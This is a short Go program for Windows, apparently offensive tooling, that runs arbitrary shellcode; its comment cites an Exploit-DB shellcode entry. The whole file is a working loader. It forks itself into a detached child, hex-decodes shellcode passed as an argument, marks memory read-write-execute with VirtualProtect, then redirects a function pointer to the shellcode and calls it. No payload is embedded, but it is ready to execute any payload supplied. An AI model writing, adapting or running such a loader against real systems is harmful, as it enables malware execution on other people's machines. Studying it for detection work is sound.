// This program runs the shellcode from: https://www.exploit-db.com/exploits/40245/
//
// As the shellcode is 32 bit, this must also be compiled as a 32 bit go application
// via "set GOARCH=386"

package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func fork() bool {
	if os.Getenv("CHILD") != "" {
		return false
	}

	log.Println("Forking child")
	os.Setenv("CHILD", "true")
	cmd := exec.Command(os.Args[0], os.Args[1:]...)
	cmd.Start()
	return true
}

func main() {
	if fork() {
		os.Exit(0)
	}
	shellcode, err := hex.DecodeString(os.Args[1])
	if err != nil {
		fmt.Printf("Error decoding arg 1: %s\n", err)
		os.Exit(1)
	}

	// Make a function ptr
	f := func() {}

	// Change permsissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	// Change permsissions on shellcode string data
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Call the function ptr it
	f()
}
